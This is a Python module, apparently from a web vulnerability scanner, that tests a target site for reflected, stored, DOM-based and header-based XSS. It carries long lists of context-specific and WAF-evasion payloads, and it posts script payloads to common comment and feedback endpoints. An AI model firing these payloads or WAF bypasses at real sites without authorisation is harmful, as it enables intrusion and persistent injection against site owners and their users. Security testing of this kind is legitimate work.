"""Deep XSS detection — reflected, stored, DOM-based, with WAF bypass and context-aware payloads."""

import httpx
import re
import urllib.parse
import json
import asyncio
import html
import random
import string

# --- Reflected XSS Payloads by Context ---

HTML_CONTEXT_PAYLOADS = [
    ("basic_script", "<script>alert(1)</script>"),
    ("img_onerror", "<img src=x onerror=alert(1)>"),
    ("svg_onload", "<svg onload=alert(1)>"),
    ("body_onload", "<body onload=alert(1)>"),
    ("iframe_src", "<iframe src=javascript:alert(1)>"),
    ("details_toggle", "<details open ontoggle=alert(1)>"),
    ("input_focus", "<input autofocus onfocus=alert(1)>"),
    ("marquee_event", "<marquee onstart=alert(1)>"),
    ("video_error", "<video><source onerror=alert(1)>"),
    ("audio_error", "<audio src=x onerror=alert(1)>"),
    ("obj_error", "<object data=javascript:alert(1)>"),
    ("embed_error", "<embed src=javascript:alert(1)>"),
    ("applet_error", "<applet code=alert(1)>"),
    ("a_href", "<a href=javascript:alert(1)>click</a>"),
    ("a_tag_ping", "<a href=//x.me ping=javascript:alert(1)>"),
    ("form_action", "<form action=javascript:alert(1)><input type=submit>"),
    ("button.onclick", "<button onclick=alert(1)>click</button>"),
    ("isindex_action", "<isindex action=javascript:alert(1)>"),
    ("keygen_error", "<keygen autofocus onfocus=alert(1)>"),
    ("textarea_focus", "<textarea autofocus onfocus=alert(1)>"),
    ("select_focus", "<select autofocus onfocus=alert(1)>"),
    ("video_play", "<video autoplay onplay=alert(1)>"),
    ("img_dynsrc", "<img dynsrc=javascript:alert(1)>"),
    ("img_lowsrc", "<img lowsrc=javascript:alert(1)>"),
    ("xss_image", "<img src=\"x\" onerror=\"alert(1)\">"),
    ("xss_div", "<div onmouseover=alert(1)>hover</div>"),
    ("xss_span", "<span onmouseover=alert(1)>hover</span>"),
    ("xss_meta", "<meta http-equiv=refresh content=\"javascript:alert(1)\">"),
    ("xss_base", "<base href=javascript:alert(1)//>"),
    ("xss_link", "<link rel=import href=javascript:alert(1)>"),
    ("xss_script_src", "<script src=//x.me></script>"),
    ("xss_style", "<style>@import url('javascript:alert(1)');</style>"),
    ("xss_expression", "<div style=\"width:expression(alert(1))\">"),
    ("xss_behaviors", "<div style=\"-ms-behavior:url(#default#time2)\">"),
]

ATTR_CONTEXT_PAYLOADS = [
    ("attr_quote_break", "\" onmouseover=alert(1) \""),
    ("attr_single_break", "' onmouseover=alert(1) '"),
    ("attr_noquote_break", "onmouseover=alert(1) "),
    ("attr事件注入", "\" onfocus=alert(1) autofocus=\""),
    ("attr_tab_bypass", "\"\tonmouseover=alert(1)\t\""),
    ("attr_newline_bypass", "\"\nonmouseover=alert(1)\n\""),
    ("attr_backtick", "\"` onmouseover=alert(1) `\""),
    ("attr_x1", "\" x=\" onmouseover=alert(1) \""),
    ("attr_space_injection", "\" /onmouseover=alert(1) \""),
    ("attr_double_event", "\" onfocus=alert(1) onmouseover=alert(1) \""),
    ("attr_autofocus", "\" autofocus onfocus=alert(1) \""),
    ("attr_accesskey", "\" accesskey=x onclick=alert(1) \""),
    ("attr_formaction", "\" formaction=javascript:alert(1) \""),
    ("attr_dynsrc", "\" dynsrc=javascript:alert(1) \""),
    ("attr_lowsrc", "\" lowsrc=javascript:alert(1) \""),
]

JS_CONTEXT_PAYLOADS = [
    ("js_string_break", "';alert(1)//"),
    ("js_string_break2", "\";alert(1)//"),
    ("js_string_break3", "');alert(1)//"),
    ("js_string_break4", "\");alert(1)//"),
    ("js_template", "${alert(1)}"),
    ("js_backtick", "`alert(1)`"),
    ("js_unicode", "\\u0061lert(1)"),
    ("js_hex", "\\x61lert(1)"),
    ("js_octal", "\\141lert(1)"),
    ("js_eval", "eval(atob('YWxlcnQoMSk='))"),
    ("js_constructor", "constructor.constructor('alert(1)')"),
    ("js_proto", "__proto__.constructor('alert(1)')"),
    ("js_assign", "this.constructor.constructor('alert(1)')()"),
    ("js_function", "Function('alert(1)')()"),
    ("js_settimeout", "setTimeout('alert(1)',0)"),
    ("js_setinterval", "setInterval('alert(1)',0)"),
    ("js_import", "import('javascript:alert(1)')"),
]

URL_CONTEXT_PAYLOADS = [
    ("url_javascript", "javascript:alert(1)"),
    ("url_javascript_tab", "javascript\t:alert(1)"),
    ("url_javascript_newline", "javascript\n:alert(1)"),
    ("url_data_uri", "data:text/html,<script>alert(1)</script>"),
    ("url_data_base64", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
    ("url_vbscript", "vbscript:MsgBox(1)"),
    ("url_liferay", "liferay-javascript:alert(1)"),
]

STYLE_CONTEXT_PAYLOADS = [
    ("style_expression", "expression(alert(1))"),
    ("style_behaviors", "-ms-behavior:url('xss.htc')"),
    ("style_import", "@import url('javascript:alert(1)')"),
    ("style_unicode", "background:url('javascript:alert(1)')"),
    ("style_moz", "-moz-binding:url('javascript:alert(1)')"),
]

# --- WAF Bypass Payloads ---

WAF_BYPASS_PAYLOADS = [
    ("html_comment", "<scr<!-- -->ipt>alert(1)</script>"),
    ("case_mix", "<ScRiPt>alert(1)</sCrIpT>"),
    ("double_encoding", "%253Cscript%253Ealert(1)%253C/script%253E"),
    ("utf7", "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"),
    ("utf8_overlong", "%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE"),
    ("null_byte", "%00<script>alert(1)</script>"),
    ("backslash", "\\<script\\>alert(1)\\</script\\>"),
    ("ampersand", "&lt;script&gt;alert(1)&lt;/script&gt;"),
    ("unicode_escape", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
    ("html_entity", "&#60;script&#62;alert(1)&#60;/script&#62;"),
    ("decimal_entity", "&#000060;script&#000062;alert(1)&#000060;/script&#000062;"),
    ("hex_entity", "&#x003c;script&#x003e;alert(1)&#x003c;/script&#x003e"),
    ("no_space", "<script>alert(1)</script>"),
    ("tab_in_tag", "<scr\tipt>alert(1)</scr\tipt>"),
    ("newline_in_tag", "<scr\nipt>alert(1)</scr\nipt>"),
    ("carriage_return", "<scr\ript>alert(1)</scr\ript>"),
    ("form_feed", "<scr\x0cipt>alert(1)</scr\x0cipt>"),
    ("vtab", "<scr\x0bit>alert(1)</scr\x0bit>"),
    ("angle_bracket_encoding", "%3Cscript%3Ealert(1)%3C/script%3E"),
    ("mixed_case", "<ScRiPt>alert(1)</ScRiPt>"),
    ("img_src_x", "<img src=x onerror=alert(1)>"),
    ("svg_script", "<svg><script>alert(1)</script></svg>"),
    ("math_alert", "<math><mtext><table><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>"),
    ("details_ontoggle", "<details open ontoggle=alert(1)>"),
    ("marquee_onstart", "<marquee onstart=alert(1)>"),
    ("video_onerror", "<video onerror=alert(1)><source>"),
    ("object_data", "<object data=javascript:alert(1)>"),
    ("iframe_srcdoc", "<iframe srcdoc=\"<script>alert(1)</script>\">"),
    ("base_href", "<base href=javascript://alert(1)/%0A>"),
    ("object_type", "<object type=\"text/html\" data=\"javascript:alert(1)\">"),
    ("embed_src", "<embed src=javascript:alert(1)>"),
    ("a_ping", "<a ping=javascript:alert(1)>"),
    ("area_onmouseover", "<area onmouseover=alert(1) alt='x'>"),
    ("input_image", "<input type=image src=x onerror=alert(1)>"),
    ("select_onfocus", "<select onfocus=alert(1) autofocus>"),
    ("textarea_onfocus", "<textarea onfocus=alert(1) autofocus>"),
    ("keygen_onfocus", "<keygen onfocus=alert(1) autofocus>"),
    ("body_text", "<body text=javascript:alert(1)>"),
    ("background_js", "<table background=javascript:alert(1)>"),
    ("td_background", "<td background=javascript:alert(1)>"),
    ("a_href_encoded", "<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"),
]

STORED_PATHS = [
    "/comment", "/comments", "/post", "/posts", "/submit", "/feedback",
    "/review", "/reviews", "/contact", "/message", "/messages",
    "/api/comment", "/api/feedback", "/api/review", "/api/post",
    "/api/v1/comment", "/api/v1/feedback", "/api/v1/review",
    "/forum", "/thread", "/reply", "/chat", "/shoutbox",
]

# DOM XSS detection patterns
DOM_SOURCES = [
    r"document\.URL",
    r"document\.documentURI",
    r"document\.referrer",
    r"window\.name",
    r"location\.hash",
    r"location\.search",
    r"location\.pathname",
    r"document\.cookie",
    r"postMessage",
    r"localStorage",
    r"sessionStorage",
]

DOM_SINKS = [
    r"\.innerHTML\s*=",
    r"\.outerHTML\s*=",
    r"\.insertAdjacentHTML\s*\(",
    r"document\.write\s*\(",
    r"document\.writeln\s*\(",
    r"eval\s*\(",
    r"setTimeout\s*\([^,]+string",
    r"setInterval\s*\([^,]+string",
    r"new\s+Function\s*\(",
    r"\.src\s*=",
    r"\.href\s*=",
    r"\.action\s*=",
    r"\.formAction\s*=",
    r"\.assign\s*\(",
    r"\.replace\s*\(",
    r"window\.open\s*\(",
    r"\.outerText\s*=",
    r"\.innerText\s*=",
    r"\.textContent\s*=",
]


def _detect_waf(response: httpx.Response) -> dict | None:
    """Detect WAF from response."""
    body = response.text[:5000]
    headers = dict(response.headers)

    waf_status = response.status_code in [403, 406, 429, 501, 419, 444, 493]

    waf_body_sigs = [
        "blocked by", "security policy", "web application firewall",
        "mod_security", "incapsula", "cloudflare", "forbidden",
        "request blocked", "security exception", "not acceptable",
    ]

    waf_found = any(sig in body.lower() for sig in waf_body_sigs)

    if waf_status or waf_found:
        waf_name = "Unknown WAF"
        lower_body = body.lower()
        if "cloudflare" in lower_body:
            waf_name = "Cloudflare"
        elif "incapsula" in lower_body or "imperva" in lower_body:
            waf_name = "Imperva/Incapsula"
        elif "mod_security" in lower_body:
            waf_name = "ModSecurity"
        return {"detected": True, "name": waf_name, "status": response.status_code}

    return None


def _detect_context(body: str, param: str, payload_reflection: str) -> str:
    """Detect the injection context for smarter payload selection."""
    idx = body.find(payload_reflection)
    if idx == -1:
        return "unknown"

    surrounding = body[max(0, idx - 100):idx + len(payload_reflection) + 100]

    if re.search(rf'<script[^>]*>.*{re.escape(payload_reflection)}.*</script>', surrounding, re.DOTALL):
        return "javascript"
    if re.search(rf'<[^>]*=\s*["\'][^"\']*{re.escape(payload_reflection)}', surrounding):
        return "attribute"
    if re.search(rf'href\s*=\s*["\']?javascript:', surrounding):
        return "url"
    if re.search(rf'<style[^>]*>.*{re.escape(payload_reflection)}', surrounding, re.DOTALL):
        return "style"
    if re.search(rf'<!--.*{re.escape(payload_reflection)}.*-->', surrounding, re.DOTALL):
        return "comment"

    return "html"


async def xss_detect(target: str, param: str = "", method: str = "get", use_browser: bool = False) -> dict:
    """Deep XSS detection — reflected, stored, DOM-based with WAF bypass and context-aware payloads."""
    results = []
    waf_detected = None
    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    base = target.rstrip("/")

    test_params = [param] if param else list(params.keys()) if params else [
        "q", "search", "s", "id", "page", "name", "user", "input",
        "query", "text", "msg", "message", "comment", "title", "url",
        "redirect", "next", "return", "callback", "data", "value",
    ]

    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        # Get baseline
        try:
            baseline_resp = await client.get(base)
            baseline_len = len(baseline_resp.text)
            waf = _detect_waf(baseline_resp)
            if waf:
                waf_detected = waf
        except Exception:
            baseline_len = 0

        # --- REFLECTED XSS ---
        if params or test_params:
            for p in test_params:
                all_payloads = HTML_CONTEXT_PAYLOADS + ATTR_CONTEXT_PAYLOADS + JS_CONTEXT_PAYLOADS + URL_CONTEXT_PAYLOADS
                if waf_detected:
                    all_payloads = WAF_BYPASS_PAYLOADS

                for payload_name, payload in all_payloads:
                    try:
                        if method == "get":
                            new_params = {k: v[0] for k, v in params.items()} if params else {p: payload}
                            new_params[p] = payload
                            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(new_params)}"
                            resp = await client.get(url)
                        else:
                            resp = await client.post(target, data={p: payload})

                        body = resp.text
                        payl = payload[:25].replace("\\", "").replace('"', "'")
                        reflected = payl in body

                        if reflected:
                            context = _detect_context(body, p, payl)
                            # Verify it's in an executable context
                            context_risk = {
                                "html": "CRITICAL",
                                "javascript": "CRITICAL",
                                "attribute": "HIGH",
                                "url": "CRITICAL",
                                "style": "MEDIUM",
                                "comment": "LOW",
                                "unknown": "MEDIUM",
                            }

                            results.append({
                                "type": "reflected",
                                "param": p,
                                "payload": payload_name,
                                "payload_value": payload[:80],
                                "context": context,
                                "status": resp.status_code,
                                "risk": context_risk.get(context, "MEDIUM"),
                                "confidence": "high" if context in ["html", "javascript", "url"] else "medium",
                                "waf_bypass": waf_detected is not None,
                            })
                            if context in ["html", "javascript", "url"]:
                                break  # Confirmed exploit context
                    except Exception:
                        continue

        # --- STORED XSS ---
        for path in STORED_PATHS:
            try:
                store_url = base.rstrip("/") + path
                store_payloads = [
                    "<script>alert(document.domain)</script>",
                    "<img src=x onerror=alert(document.domain)>",
                    "<svg onload=alert(document.domain)>",
                    "'\"><script>alert(1)</script>",
                ]
                for sp in store_payloads:
                    submit_data = {}
                    for field in ["name", "email", "message", "comment", "feedback", "content", "text", "body", "title"]:
                        submit_data[field] = f"test{random.randint(1,9999)} {sp}"

                    submit_resp = await client.post(store_url, data=submit_data)
                    if submit_resp.status_code in [200, 201, 302]:
                        check = await client.get(store_url)
                        if sp[:20] in check.text:
                            results.append({
                                "type": "stored",
                                "path": path,
                                "payload": "stored_xss",
                                "payload_value": sp[:80],
                                "note": "XSS payload persisted and reflected in page",
                                "status": submit_resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            break
                        if submit_resp.status_code == 302:
                            loc = submit_resp.headers.get("location", "")
                            if loc:
                                try:
                                    loc_resp = await client.get(urllib.parse.urljoin(base, loc))
                                    if sp[:20] in loc_resp.text:
                                        results.append({
                                            "type": "stored_xss_redirect",
                                            "path": path,
                                            "redirect": loc,
                                            "risk": "CRITICAL",
                                            "confidence": "high",
                                        })
                                except Exception:
                                    pass
            except Exception:
                pass

        # --- DOM XSS ---
        try:
            resp = await client.get(base)
            html_content = resp.text

            # Check for DOM sources in page
            dom_sources_found = [s for s in DOM_SOURCES if re.search(s, html_content)]
            dom_sinks_found = [s for s in DOM_SINKS if re.search(s, html_content)]

            if dom_sources_found and dom_sinks_found:
                # Check if any URL params appear in script blocks
                script_blocks = re.findall(r'<script[^>]*>([\s\S]*?)</script>', html_content, re.I)
                for p in list(params.keys())[:5] if params else ["q", "id", "search", "name", "page"]:
                    for script in script_blocks:
                        if p in script:
                            # Check if param reaches a sink
                            for sink in DOM_SINKS:
                                if re.search(sink, script):
                                    results.append({
                                        "type": "dom_based",
                                        "param": p,
                                        "source": dom_sources_found[:3],
                                        "sink": sink,
                                        "note": f"Parameter '{p}' flows from source to DOM sink — potential DOM XSS",
                                        "risk": "HIGH",
                                        "confidence": "medium",
                                    })
                                    break
        except Exception:
            pass

        # --- HEADERS INJECTION XSS ---
        header_payloads = [
            ("Referer", "<script>alert(1)</script>"),
            ("User-Agent", "<script>alert(1)</script>"),
            ("X-Forwarded-For", "<script>alert(1)</script>"),
            ("X-Forwarded-Host", "<script>alert(1)</script>"),
            ("X-Original-URL", "<script>alert(1)</script>"),
        ]
        for header_name, h_payload in header_payloads:
            try:
                resp = await client.get(base, headers={header_name: h_payload})
                if h_payload[:15] in resp.text:
                    results.append({
                        "type": "header_injection",
                        "header": header_name,
                        "payload": h_payload[:80],
                        "risk": "HIGH",
                        "confidence": "medium",
                    })
            except Exception:
                continue

        # --- BROWSER-BASED XSS (Playwright) ---
        if use_browser:
            try:
                from playwright.async_api import async_playwright
                async with async_playwright() as pw:
                    browser = await pw.chromium.launch(headless=True)
                    page = await browser.new_page()

                    for p in test_params[:5]:
                        try:
                            new_params = {k: v[0] for k, v in params.items()} if params else {p: "<img src=x onerror=alert(1)>"}
                            new_params[p] = "<img src=x onerror=alert(1)>"
                            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(new_params)}"

                            dialog_handled = False
                            async def handle_dialog(dialog):
                                nonlocal dialog_handled
                                dialog_handled = True
                                await dialog.dismiss()

                            page.on("dialog", handle_dialog)
                            await page.goto(url, timeout=10000)
                            await asyncio.sleep(1)

                            if dialog_handled:
                                results.append({
                                    "type": "browser_confirmed",
                                    "param": p,
                                    "payload": "onerror_alert",
                                    "note": "alert() executed in browser — confirmed XSS",
                                    "risk": "CRITICAL",
                                    "confidence": "confirmed",
                                })
                                page.remove_listener("dialog", handle_dialog)
                                break
                            page.remove_listener("dialog", handle_dialog)
                        except Exception:
                            continue

                    await browser.close()
            except ImportError:
                results.append({
                    "type": "browser_xss",
                    "note": "Playwright not installed — pip install playwright && playwright install chromium",
                    "risk": "INFO",
                })
            except Exception as e:
                results.append({"type": "browser_xss", "error": str(e)[:80], "risk": "INFO"})

    return {
        "target": target,
        "waf_detected": waf_detected,
        "results": results,
        "vulnerable": any(r.get("risk") in ["CRITICAL", "HIGH"] for r in results),
        "total_findings": len(results),
        "types_found": list(set(r["type"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
            "low": sum(1 for r in results if r.get("risk") == "LOW"),
        },
    }
